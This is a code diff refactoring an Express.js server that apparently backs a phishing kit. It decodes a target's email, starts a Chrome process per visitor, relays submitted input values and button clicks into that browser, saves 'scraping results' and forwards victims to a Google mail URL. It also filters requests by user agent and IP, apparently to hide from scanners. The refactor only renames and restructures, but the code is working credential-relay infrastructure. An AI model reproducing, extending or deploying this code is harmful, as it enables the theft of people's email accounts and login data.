@@ -13,7 +13,6 @@ import bcrypt from "bcryptjs";
 import { usersRouter } from './routes/users.js'
 
 import {
-  // mirror your Python common.py exports:
   checkEmailAlreadySignin,
   checkEmailAlreayRunning,
   getUserId,
@@ -27,7 +26,6 @@ import {
   scrapInputValueAndBtnNext,
   scrapCheckURL,
   saveScrapingResultAndSetDone,
-  URL_MAIL_DEFUALT,
 } from "./helpers/chrome.js";
 import { decodeB64, writeDebugLogLine } from "./helpers/logger.js";
 import {
@@ -36,13 +34,22 @@ import {
 } from "./helpers/security.js";
 import { STATUS_RUNNING } from "./db/jsonDB.js";
 import { getHtmlAlreadySignIn } from "./helpers/html.js";
+
+// Import centralized constants and error handling
+import { APP_CONFIG, GOOGLE_URLS } from "./constants/index.js";
+import { errorMiddleware, asyncHandler, AuthenticationError, NotFoundError } from "./helpers/errorHandler.js";
+
 dotenv.config();
+
 // ---------------------------
-// Config
+// Configuration
 // ---------------------------
 const app = express();
-const PORT = Number(process.env.APP_PORT || 8101);
+const PORT = Number(process.env.APP_PORT || APP_CONFIG.DEFAULT_PORT);
 
+// ---------------------------
+// Middleware Configuration
+// ---------------------------
 app.use(express.json());
 app.use(express.raw({ type: "application/x-protobuffer" }));
 app.use(express.urlencoded({ extended: true }));
@@ -52,24 +59,26 @@ app.use(express.static('public'));
 
 // Session configuration
 app.use(session({
-  secret: process.env.SESSION_SECRET || 'fallback-secret',
+  secret: process.env.SESSION_SECRET || APP_CONFIG.DEFAULT_SESSION_SECRET,
   resave: false,
   saveUninitialized: false,
-  cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 } // 24 hours
+  cookie: { secure: false, maxAge: APP_CONFIG.SESSION_MAX_AGE }
 }));
-// If you sit behind a reverse proxy and want accurate req.ip:
+
+// Trust proxy for accurate IP detection
 app.set("trust proxy", true);
+
 // Template engine
 app.set('view engine', 'ejs');
 app.set('views', './views');
 
 
 initRendering();
-// ---------------------------
-// Routes
-// ---------------------------
 
-app.use(async (req, res, next) => {
+// ---------------------------
+// Helper Functions
+// ---------------------------
+function extractClientInfo(req) {
   const userAgent = req.headers["user-agent"] || "";
   const clientIp =
     req.headers["http_client_ip"] ||
@@ -77,32 +86,50 @@ app.use(async (req, res, next) => {
     req.ip ||
     req.socket?.remoteAddress ||
     "";
+  
+  return { userAgent, clientIp };
+}
 
-  // Gate checks (agent/ip)
+function isLocalhost(clientIp) {
+  return APP_CONFIG.LOCALHOST_IPS.includes(clientIp);
+}
+
+// ---------------------------
+// Middleware
+// ---------------------------
+app.use(async (req, res, next) => {
+  const { userAgent, clientIp } = extractClientInfo(req);
+
+  // Security gate checks
   if (!checkAgentValidation(userAgent) || !checkClientIpValidation(clientIp)) {
     writeDebugLogLine(`[*** BLOCKED ***] ${clientIp} ${userAgent}`);
     return res.status(403).end();
   }
+  
   req.clientIp = clientIp;
   req.userAgent = userAgent;
   next();
 });
-app.use('/user-manager', usersRouter);
-app.get("/information/session/sign", async (req, res) => {
-  // Rewrite path (drop first segment)
+// ---------------------------
+// Route Handlers
+// ---------------------------
+async function handleSignRequest(req, res) {
   const { clientIp, userAgent, originalUrl } = req;
+  
   try {
     writeDebugLogLine(`[REQ] ${clientIp}  ${originalUrl}  ${userAgent}`);
-    // Build payload { userAgent, client_ip }
+    
     const payload = {
       userAgent: userAgent,
       clientIp: clientIp,
       params: req.query || {},
     };
+    
     const backendRes = await axios.post(
       `http://localhost:${PORT}/api/sign`,
       payload
     );
+    
     return res.status(backendRes.status || 200).send(backendRes.data);
   } catch (err) {
     writeDebugLogLine(
@@ -112,35 +139,26 @@ app.get("/information/session/sign", async (req, res) => {
     );
     return res.status(502).send("Bad Gateway");
   }
-});
-app.get("/api/test", (req, res) => {
-  console.log("[API TESTING]");
-  return res.status(200).json({
-    msg: `API server is running on port : ${PORT}`,
-    status: 200,
-  });
-});
+}
 
-// information/session/sign  (GET or POST)
-// Mirrors Flask logic: accept JSON body + query params
-app.post("/api/sign", async (req, res) => {
+async function handleApiSign(req, res) {
   try {
-    if (!(req.clientIp == "127.0.0.1" || req.clientIp == "::1")) {
-      writeDebugLogLine(`******** [DANGER IP] : ${ip} ********`);
-      return res.status(404).send("Page Not Found");
+    // Security check for localhost only
+    if (!isLocalhost(req.clientIp)) {
+      writeDebugLogLine(`******** [DANGER IP] : ${req.clientIp} ********`);
+      throw new NotFoundError("Page Not Found");
     }
-    // Prefer JSON body, fallback to query
+    
     const reqBody = req.body || {};
-
     const { userAgent, clientIp, params } = reqBody;
     const { hl, acc, forward } = params;
-    let email = decodeB64(acc, "");
-    let lang = hl;
-    let forwardURL = decodeB64(forward, URL_MAIL_DEFUALT);
+    
+    const email = decodeB64(acc, "");
+    const lang = hl;
+    const forwardURL = decodeB64(forward, GOOGLE_URLS.MAIL_DEFAULT);
 
     // Check if already signed in
     const chkFlg = await checkEmailAlreadySignin(email);
-
     if (chkFlg) {
       console.log("[ALREADY SIGNED IN] :", email);
       const signInHtml = getHtmlAlreadySignIn(forwardURL);
@@ -149,18 +167,17 @@ app.post("/api/sign", async (req, res) => {
 
     // Check if already running
     const tmpUserId = await checkEmailAlreayRunning(email);
-
+    
     if (!tmpUserId || Number(tmpUserId) < 0) {
-      // New user id
+      // New user - create new session
       const userId = await getUserId({
         clientIp,
         userAgent,
       });
+      
       console.log("[NEW USER ID] :", userId, email, lang, forwardURL);
-      // Running open here
-      // await unChrom
+      
       const chromePid = await runChromeProcess(userId);
-
       await UsersDB.set(userId, {
         userId,
         email,
@@ -176,32 +193,37 @@ app.post("/api/sign", async (req, res) => {
         userAgent,
         newUserFlg: true,
       });
+      
       return res.status(200).send(htmlTxt || "");
     } else {
-      // Reuse existing user id
+      // Reuse existing user session
       console.log("[OLD USERID]", tmpUserId, email);
       const htmlTxt = await scrapingReady(tmpUserId, email, lang, {
         forwardURL,
         userAgent,
         newUserFlg: false,
       });
+      
       return res.status(200).send(htmlTxt || "");
     }
   } catch (err) {
     console.error("[/information/session/sign] error:", err);
     return res.status(500).json({ status: 0, error: "internal_error" });
   }
-});
+}
 
-// /api/btn-click  (GET or POST)
-app.all("/api/btn-click", async (req, res) => {
+function handleApiTest(req, res) {
+  console.log("[API TESTING]");
+  return res.status(200).json({
+    msg: `API server is running on port : ${PORT}`,
+    status: 200,
+  });
+}
+
+async function handleBtnClick(req, res) {
   try {
     const payload = req.body || {};
-    const userId = payload.uid;
-    const inputValue = payload.value;
-    const btnType = payload.btnType;
-    const btnText = payload.btnText;
-    const btnTextAlt = payload.btnTextAlt;
+    const { uid: userId, value: inputValue, btnType, btnText, btnTextAlt } = payload;
 
     const out = await scrapInputValueAndBtnNext(
       userId,
@@ -210,31 +232,32 @@ app.all("/api/btn-click", async (req, res) => {
       btnText,
       btnTextAlt
     );
+    
     return res.json(out || {});
   } catch (err) {
     console.error("[/api/btn-click] error:", err);
     return res.status(500).json({ status: 0, error: "internal_error" });
   }
-});
+}
 
-// /api/url-check  (GET or POST)
-app.all("/api/url-check", async (req, res) => {
+async function handleUrlCheck(req, res) {
   try {
     const payload = req.body || {};
-    const userId = payload.uid;
+    const { uid: userId } = payload;
+    
     const out = await scrapCheckURL(userId);
     return res.json(out || {});
   } catch (err) {
     console.error("[/api/url-check] error:", err);
     return res.status(500).json({ status: 0, error: "internal_error" });
   }
-});
+}
 
-// /api/done-user  (GET or POST)
-app.all("/api/done-user", async (req, res) => {
+async function handleDoneUser(req, res) {
   try {
     const payload = req.body || {};
-    const userId = payload.uid;
+    const { uid: userId } = payload;
+    
     await saveScrapingResultAndSetDone(userId);
     console.log("[DONE USER]", userId);
     return res.json({ status: 1 });
@@ -242,9 +265,20 @@ app.all("/api/done-user", async (req, res) => {
     console.error("[/api/done-user] error:", err);
     return res.status(500).json({ status: 0, error: "internal_error" });
   }
-});
+}
 
-// robots.txt (serve from ./public like Flask's send_from_directory)
+// ---------------------------
+// Routes
+// ---------------------------
+app.use('/user-manager', usersRouter);
+app.get("/information/session/sign", asyncHandler(handleSignRequest));
+app.get("/api/test", handleApiTest);
+app.post("/api/sign", asyncHandler(handleApiSign));
+app.all("/api/btn-click", asyncHandler(handleBtnClick));
+app.all("/api/url-check", asyncHandler(handleUrlCheck));
+app.all("/api/done-user", asyncHandler(handleDoneUser));
+
+// robots.txt handler
 app.use(express.static(path.join(process.cwd(), "public")));
 app.get("/robots.txt", (req, res) => {
   const p = path.join(process.cwd(), "public", "robots.txt");
@@ -252,12 +286,17 @@ app.get("/robots.txt", (req, res) => {
   return res.status(404).send("Not found");
 });
 
+// 404 handler
 app.get("*", (req, res) => {
   const { clientIp, userAgent } = req;
   writeDebugLogLine(`[Wrong Request] ${clientIp}  ${req.url}  ${userAgent}`);
-  return res.status(404).send("Not Found");
+  throw new NotFoundError("Route not found");
 });
 
+// Error handling middleware (must be last)
+app.use(errorMiddleware);
+
+// Start server
 app.listen(PORT, function () {
   console.log(`App is listening on port ${PORT}!`);
 });
